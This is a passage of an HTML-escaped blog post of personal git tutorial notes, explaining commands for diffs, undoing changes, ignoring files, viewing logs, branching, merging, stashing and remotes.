&lt;&#x2F;span&gt;&lt;span&gt;Date:   Thu Dec 27 09:48:16 2018 -0500
&lt;&#x2F;span&gt;&lt;span&gt;HEAD pointer - It&amp;#39;s job is to reference commits in the Repository, not the Working or Staging Index. Last state of Repository, what was last checked out. The HEAD always moves to the tip of the current branch. 5c15e3(Master) -&amp;gt; 38e73d -&amp;gt; a614b5(HEAD)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;This command shows where the HEAD pointer is currently positioned.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cat .git&#x2F;HEAD
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This command shows the SHA1 where the HEAD pointer is currently positioned.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cat .git&#x2F;refs&#x2F;heads&#x2F;master
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;5-making-changes-to-files&quot;&gt;5: Making changes to files&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Show the current git status of the repository. It will show the current branch, what files has been added, and what files hasn&#x27;t been committed yet.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git status
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show the difference between files in Working vs HEAD&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;git diff firstfile.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show the difference between files in Staging Index vs Repository&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff --staged
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;git&lt;&#x2F;code&gt; will remove the file from the directory and from it&#x27;s Staging Index. If you manually remove a file via Finder, you will still have to remove the file from the git repository. The advantage of having it in your git repository is that you can still copy the file back from repository to Working Index.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git rm firstfile.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The takeaway lesson is letting git to handle the moving&#x2F;renaming&#x2F;deletion of files instead of your OS commands.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;6-git-and-real-projects&quot;&gt;6: Git and real projects&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;This will show diff in a side-by-side instead of two separate lines f - forward b - backward + S - This will fold the lines&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff --color-words contact.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This is an easy way to add everything in a directory&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git add tours&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The takeaway lesson is pay attention to the git status and make sure before committing, the files added is related to the message. I know I have ran into issues before where I lumped all my files into one big commit and it&#x27;s all unrelated changes to each other.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;7-undoing-changes&quot;&gt;7: Undoing Changes&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;This command restores the file from repository to working tree. As part of best practices, -- indicates current branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git checkout -- index.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Unstaging files. This is a way to unstage a file after accidently running git add . command. You don&#x27;t want to lump unnecessary files into a commit that isn&#x27;t related.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git reset HEAD index.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Amending commits. This command is a way to make changes to the last commit (HEAD position). You will have to execute git add first before amending.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git commit --amend -m &amp;quot;Commit message&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Retrieving old versions. This command will checkout a specific file based on the SHA1 revision in git log. When executed, it will store the file in Staging Index so you can run git diff --staged to see the changes between Staging Index vs HEAD.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git checkout &amp;lt;SHA1&amp;gt; -- index.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Scary command. This repositions where the HEAD position should start recording. Cassette tape analogy. Be careful when running these commands as git log won&#x27;t show commits depending on HEAD position.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;code&gt;--soft&lt;&#x2F;code&gt; - Safest option. Reposition HEAD. Does not change Staging Index or Working directory&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;--mixed&lt;&#x2F;code&gt; - Default option. Changes Staging Index to match Repository&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;--hard&lt;&#x2F;code&gt; - Scariest option. Use this option when everything seems to be completely wrong. Changes Working and Staging Index to match Repository&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git reset
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Removing untracked files. This command will remove untracked files as a dry-run.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git clean -n
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This command will delete the untracked file even in Working and Staging Index&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git clean -f
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;8-ignoring-files&quot;&gt;8: Ignoring files&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Supports basic RegEx. If you add &lt;code&gt;*.php&lt;&#x2F;code&gt; and &lt;code&gt;!index.php&lt;&#x2F;code&gt;, it means that all .php files will be ignored except for index.php&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.gitignore
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;What to ignore: compiled source code, packages and compressed files, logs and databases, OS generated files (.DS_Store), user-uploaded assets (images, videos, PDF)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This command affects all .gitignore files globally, not repository specific.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git config --global core.excludesfiles ~&#x2F;.gitignore_global
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Ignore tracked files. This command untracks and removes the file from the Working Index. It does not remove from Working or Repository.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git rm --cached index.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To track empty directories, create a &lt;code&gt;.gitkeep&lt;&#x2F;code&gt; file inside the empty directory. Git will not track empty directories by default.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;9-navigating-commit-tree&quot;&gt;9: Navigating Commit Tree&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;tree-ish - Means something that references part of the tree. Tree-ish is a reference to a commit (SHA1)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;parent commit - &lt;code&gt;HEAD^, acf87503^, master^, HEAD~1, HEAD~&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;grandparent commit - &lt;code&gt;HEAD^^, acf87503^^, master^^, HEAD~2&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;great-grandparent commit - &lt;code&gt;HEAD^^^, acf87503^^^, master^^^, HEAD~3&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git ls-tree &amp;lt;tree-ish&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Most commonly used&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --oneline
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show the last 3 commits&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --oneline -3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show commit log 3 days ago git log --since=&amp;quot;2.days&amp;quot;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --until=&amp;quot;3 days ago&amp;quot; - 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show all commit logs between two SHA hashes&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log 2907a32..acf8750 --oneline
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show all logs from SHA1 going forward (..) that affects index.html and show changes (-p)&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log -p 2907a32.. index.html
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show all stats and summary of commit log. A good high level view of what is most frequently changed.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --stat --summary
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show log as a graph. Great way to visualize branches.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --graph
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Nice combo&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --oneline --graph --all --decorate
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show changes in a commit log&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git show &amp;lt;tree-ish&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show changes at HEAD position&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git show --format=oneline HEAD
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff &amp;lt;SHA1&amp;gt;..&amp;lt;SHA1&amp;gt; --oneline
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Compare two commits and ignore whitespace changes&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff -w &amp;lt;SHA1&amp;gt;..&amp;lt;tree-ish&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;10-branching&quot;&gt;10: Branching&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Diagram of how git branching looks like and where the HEAD position moves when branched: Git Branching&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-branching.png&quot; alt=&quot;lynda-git-branching&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Find which branch you are currently working on&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Switch to specific branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git checkout &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Create and switch to new branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git checkout -b &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;One thing to note, if you make a change to a file without committing and you try to switch a branch, git may throw an error saying by switching branches. It will indicate that by checking out a different branch, the file you made a change in Working will be discarded. The reason behind this is because switching branches mirrors what is in the Repository into your Working. Three ways to resolve this issue:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Switch to branch and discard changes&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Commit changes to current branch&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Stash the changes&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show changes between two branches&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git diff &amp;lt;branch name&amp;gt;..&amp;lt;branch name&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show current branch and the branch ancestors of what the current branch also contains.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch --merged
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Rename branch name&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch -m &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Delete branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch -d &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Delete branch forcefully&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch -D &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;11-merging-branches&quot;&gt;11: Merging Branches&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Merge specific branch into current branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git merge &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;When merging, the current branch is the receiving branch.&lt;&#x2F;p&gt;
&lt;p&gt;Fast-forward merge vs true merge. FF merge is when the master branch hasn&#x27;t diverged into a branch that has been making changes ahead of master branch. True merge (no-ff) is when it creates a new commit on current branch with merging branch as a new starting point. It does not remove the merging branch.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-fast-forward-merge.jpg&quot; alt=&quot;lynda-git-fast-forward-merge&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git merge --no-ff branch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git merge --ff-only branch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Git merge conflicts. Git will indicate that there is a merging conflict and advises to resolve conflicts before committing. &lt;code&gt;git status&lt;&#x2F;code&gt; will show you which file is causing the issue and if you edit the file, it will have sections where the conflicts begin and end.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Resolving git conflicts:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Abort merge&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Resolve the conflict manually&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use a merge tool (learn to do this manually first)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Abort the merge&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git merge --abort
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use this command to show changes when resolving merging conflict issues&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git show &amp;lt;tree-ish&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Great way to take a look at the branches in terminal. Use this when resolving conflicts.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --oneline --graph --all --decorate
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show various tools you can use to troubleshoot conflict issues.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git mergetool
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Strategies to reduce conflicts:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Keep lines short. It will be easier for git to indicate where the conflict between two files are rather than a chunk of paragraph&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Keep commits small and focused.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Beware stray edits to whitespaces (spaces, tabs, line returns)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Merge often. May not be practical but the longer you wait, the chances of running into conflicts become greater&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Track changes to master&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-trackchangestomaster.gif&quot; alt=&quot;lynda-git-trackchangestomaster&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;12-stashing-changes&quot;&gt;12: Stashing Changes&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Stash file from Working&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash save &amp;quot;message&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show stashed files&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash list
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show diff of stashed file&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash show -p {stash ref}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Remember, stashing doesn&#x27;t care what branch you are currently on or which branch you stashed it from. Stash when executed copies the file(s) to the Working tree.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Copy stashed file to Working tree and do not leave a copy in stash. Commonly used rather than git stash apply&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash pop
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Copy stashed file to Working tree&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash apply
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Delete stashed item&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash drop {stash ref}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Clears out all stashed items&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git stash clear
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;13-remotes&quot;&gt;13: Remotes&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The best practice with syncing with a remote branch while minimizing conflicts with other collaborators is to fetch the changes from remote repository first before committing your own changes to the remote repository.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;You made changes on your local computer and waiting to push changes to remote repository&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Fetch the new changes from remote repository. If you take a look at the gif below, origin&#x2F;master is a local copy of the remote repository&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Merge your awaiting changes to the branch that you just fetched to remote repository&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-remoterepo.gif&quot; alt=&quot;lynda-git-remoterepo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;You can have multiple remote repositories per project.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git remote add &amp;lt;alias (origin)&amp;gt; &amp;lt;git url&amp;gt;.git
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Remove remote alias&lt;&#x2F;p&gt;
